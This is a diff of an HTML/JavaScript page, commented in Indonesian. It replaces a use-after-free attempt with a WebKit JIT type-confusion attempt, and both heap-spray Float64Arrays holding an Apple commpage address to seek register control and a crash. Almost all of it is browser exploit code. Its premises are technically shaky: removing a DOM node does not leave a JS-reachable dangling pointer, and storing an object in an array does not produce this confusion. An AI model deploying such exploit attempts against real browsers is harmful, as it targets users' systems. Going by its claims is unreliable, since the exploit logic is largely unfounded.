@@ -1,121 +1,114 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>UAF Commpage Register Control</title>
-    <style>
-        /* Gaya CSS */
-    </style>
-</head>
+    <title>WebKit JIT Type Confusion Attack</title>
+    </head>
 <body>
 
-    <h1>UAF Register Control Experiment (Targeting Commpage Address)</h1>
+    <h1>JIT Type Confusion Register Control Experiment</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Siap memulai UAF...</p>
+    <p id="status">INIT: Siap memulai JIT Fuzzing...</p>
     <div id="log"></div>
 
     <script>
-        // --- KONSTANTA COMM PAGE (DARI PANDUAN APPLE) ---
+        // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; // 0x0000000FFFFFC320
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
-        // Pemisahan 64-bit address menjadi dua 32-bit words (untuk injeksi ke memori)
-        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Untuk userspace, ini 0.
+        const LOW_WORD = TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn; 
+        const HIGH_WORD = TARGET_CONTROL_ADDRESS >> 32n;
 
-        let victimPointer = null; // Pointer yang akan kita buat menjadi "dangling"
-        let sprayHolders = [];    // Array untuk mencegah Payload di-GC
-        let isCrashed = false;
+        let globalJITArray = new Array(1024).fill(0.0); // Array besar untuk heap spray dan JIT
+        let objectsToHold = []; // Untuk mencegah GC
 
         function log(message) {
-            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
+            document.getElementById('log').innerHTML = '<div>' + message + '</div>' + document.getElementById('log').innerHTML;
         }
-
-        // 1. ALLOCATION (Fase Membuat Objek Target)
-        function phase1_Allocate() {
-            // Membuat objek yang kompleks di heap yang mungkin memiliki pointer C++
-            victimPointer = document.createElement('img');
-            victimPointer.id = 'victim';
-            document.body.appendChild(victimPointer);
-            log("Phase 1: Objek Target (img) dibuat.");
-        }
-
-        // 2. FREE (Fase Menciptakan Lubang Memori)
-        function phase2_Free() {
-            // Hapus objek dari DOM (ini memicu C++ destructor dan free memori)
-            if (victimPointer && victimPointer.parentNode) {
-                victimPointer.parentNode.removeChild(victimPointer);
-                // NAMUN, kita TIDAK menghapus 'victimPointer' di JavaScript.
-                // victimPointer sekarang adalah 'dangling pointer' (UAF).
-                log("Phase 2: Objek Target dihapus dari DOM (FREE). Lubang memori dibuat.");
+        
+        // 1. FUNGSI TARGET OPTIMASI JIT
+        // Fungsi ini akan dipanggil berulang kali agar WebKit JIT mengoptimalkannya
+        function jiggleAndOptimize(arr, targetType) {
+            let sum = 0;
+            for (let i = 0; i < arr.length; i++) {
+                // Asumsi JIT: Array ini hanya berisi Bilangan Bulat (Integer)
+                if (targetType === 'int') {
+                    arr[i] = arr[i] + 1;
+                } 
+                // Asumsi JIT: Array ini hanya berisi Bilangan Float
+                else if (targetType === 'float') {
+                    arr[i] = arr[i] + 0.5;
+                }
+                sum += arr[i];
             }
+            return sum;
         }
 
-        // 3. RE-ALLOCATE (Fase Mengisi Lubang dengan Payload)
-        function phase3_SprayPayload() {
-            const SPRAY_COUNT = 500; // Jumlah array yang banyak untuk memastikan kita menimpa lubang
-            const SPRAY_SIZE = 12;   // Ukuran yang disesuaikan untuk menimpa objek DOM
-
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                // Gunakan DataView/Float64Array karena ukurannya stabil dan dapat menyimpan 64-bit values.
-                let payloadArray = new Float64Array(SPRAY_SIZE);
-                
-                // Masukkan ALAMAT COMM PAGE ke array
-                // Kita berharap data ini sekarang menggantikan struktur C++ dari objek 'img' yang sudah di-free.
-                payloadArray[0] = HIGH_WORD; // Bagian atas 
-                payloadArray[1] = LOW_WORD;  // Bagian bawah (Target Address: 0xFFFFC320)
-                payloadArray[2] = 7331.0;    // Nilai acak pengisi
-
-                // Simpan referensi payload
-                sprayHolders.push(payloadArray); 
-            }
-            log(`Phase 3: Heap Spraying dengan ${SPRAY_COUNT} Payload (0x...C320).`);
-        }
-
-        // 4. TRIGGER (Fase Memanfaatkan UAF)
-        function phase4_TriggerUAF() {
-            if (isCrashed) return;
-
-            // Sekarang kita mencoba menggunakan 'victimPointer' yang seharusnya sudah mati,
-            // tetapi kini menunjuk ke Payload yang berisi alamat Commpage.
-            try {
-                // Akses properti yang akan memicu dereferensi pointer C++ internal
-                // Pointer internal ini sekarang berisi TARGET_CONTROL_ADDRESS (0x0000000FFFFFC320)
-                // CPU akan mencoba mengakses memori di 0x0000000FFFFFC320, yang berisi _COMM_PAGE_ASB_TARGET_VALUE
-                log("Phase 4: Memicu UAF Dereference (Mencoba mengakses memori Commpage)...");
-                
-                // Mengakses properti 'align' pada objek img sering memicu dereferensi pointer
-                victimPointer.align = "crash"; 
-
-            } catch (e) {
-                // Menangani error JS (tetapi crash yang kita cari adalah crash OS/Segfault)
-                log("Error: " + e.message + " - Crash OS diharapkan, BUKAN error JS.");
-            }
+        // 2. FUNGSI INJEKSI PAYLOAD (Type Confusion Attack)
+        function triggerTypeConfusion(arr, payloadValue) {
+            const index = 5; 
             
-            // Jaga agar referensi tetap ada (jangan segera hapus sprayHolders)
+            // Lakukan JIT Optimization terlebih dahulu (panggilan panas)
+            for(let i = 0; i < 50000; i++) {
+                jiggleAndOptimize(arr, 'float');
+            }
+            log("Phase 1: Array teroptimasi sebagai Float64Array...");
+
+            // Sekarang, lakukan Type Confusion
+            // WebKit JIT berasumsi arr[index] adalah float, tetapi kita memasukkan objek DOM.
+            // Di level memori C++, ini bisa menyebabkan 'objek' ditimpa oleh 'float' (64 bit)
+            arr[index] = document.createElement('iframe'); 
+            log("Phase 2: Injeksi Objek DOM. Memicu Type Confusion!");
+
+            // Coba timpa pointer yang baru dibuat oleh Type Confusion
+            // dengan Payload kita (Alamat Commpage).
+            // Kita harus menciptakan objek JavaScript lain yang ukurannya sama persis
+            // dengan struktur internal objek DOM yang baru saja kita injeksikan.
+            
+            const PAYLOAD_SIZE = 12; 
+            for(let i = 0; i < 100; i++) {
+                let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                // Masukkan ALAMAT COMM PAGE sebagai nilai float
+                payloadArray[0] = Number(HIGH_WORD); 
+                payloadArray[1] = Number(LOW_WORD); 
+                payloadArray[2] = 0.0; // Data pengisi
+                
+                objectsToHold.push(payloadArray); // Menahan referensi
+            }
+            log("Phase 3: Heap Spraying dengan Payload Commpage.");
+
+            // 3. TRIGGER (Membaca/Menulis Data yang Sudah Rusak)
+            
+            // Memaksa JIT untuk menjalankan kode yang teroptimasi, tetapi sekarang data telah dirusak
+            try {
+                // JIT akan menjalankan kode yang dioptimalkan, mengira arr[index] adalah float,
+                // tetapi arr[index] sebenarnya adalah alamat Commpage kita.
+                // Jika Type Confusion berhasil, WebKit akan mencoba melakukan operasi pada alamat Commpage
+                // yang akan memuat _COMM_PAGE_ASB_TARGET_VALUE ke register.
+                
+                const value = arr[index] * 2; // Operasi yang dioptimalkan JIT
+                log("Phase 4: Akses data yang rusak. Nilai yang dibaca: " + value);
+                
+                // Jika masih belum crash, coba trigger yang lebih agresif
+                arr[index] = new Object(); // Coba ubah tipe lagi
+                
+            } catch (e) {
+                log("JS Error: " + e.message); 
+            }
         }
         
         // --- URUTAN EKSEKUSI ---
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian UAF...';
+            document.getElementById('status').textContent = 'Memulai Fuzzing JIT...';
             
-            // 1. Alokasi
-            setTimeout(phase1_Allocate, 100);
+            // Isi array utama
+            globalJITArray = globalJITArray.map(() => Math.random());
             
-            // 2. Free
-            setTimeout(phase2_Free, 200);
-            
-            // 3. Re-allocate / Spray Payload
-            setTimeout(phase3_SprayPayload, 300);
-            
-            // 4. Trigger (Lakukan berulang kali untuk stabilitas)
-            // Timeout yang singkat sangat penting untuk timing yang pas (race condition)
-            for (let i = 0; i < 50; i++) {
-                 setTimeout(phase4_TriggerUAF, 400 + (i * 10));
-            }
-            
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tunggu Crash.';
+            // Panggil fungsi pemicu Type Confusion
+            triggerTypeConfusion(globalJITArray, TARGET_CONTROL_ADDRESS);
+
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Periksa Crash Log.';
         });
 
     </script>
